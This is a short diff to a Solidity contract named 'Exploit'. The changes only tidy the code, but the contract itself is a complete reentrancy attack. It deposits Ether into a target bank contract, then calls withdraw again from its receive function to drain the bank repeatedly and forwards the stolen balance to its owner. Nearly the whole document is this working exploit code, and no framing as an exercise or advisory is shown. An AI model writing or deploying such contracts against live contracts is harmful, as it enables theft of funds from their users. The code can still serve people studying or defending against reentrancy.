@@ -7,26 +7,26 @@ interface IBank {
 }
 
 contract Exploit {
-    address public target;
+    IBank public bank;
     address public owner;
     uint256 public amt;
 
-    constructor(address _target) payable {
-        target = _target;
+    constructor(address target) payable {
+        bank = IBank(target);
         owner = msg.sender;
     }
 
     function attack() external {
         amt = address(this).balance;
-        IBank(target).deposit{value: amt}();
-        IBank(target).withdraw();
+        bank.deposit{value: amt}();
+        bank.withdraw();
         (bool ok, ) = owner.call{value: address(this).balance}("");
-        require(ok, "payout failed");
+        require(ok, "send failed");
     }
 
     receive() external payable {
-        if (target.balance >= amt && amt > 0) {
-            IBank(target).withdraw();
+        if (amt > 0 && address(bank).balance >= amt) {
+            bank.withdraw();
         }
     }
 }
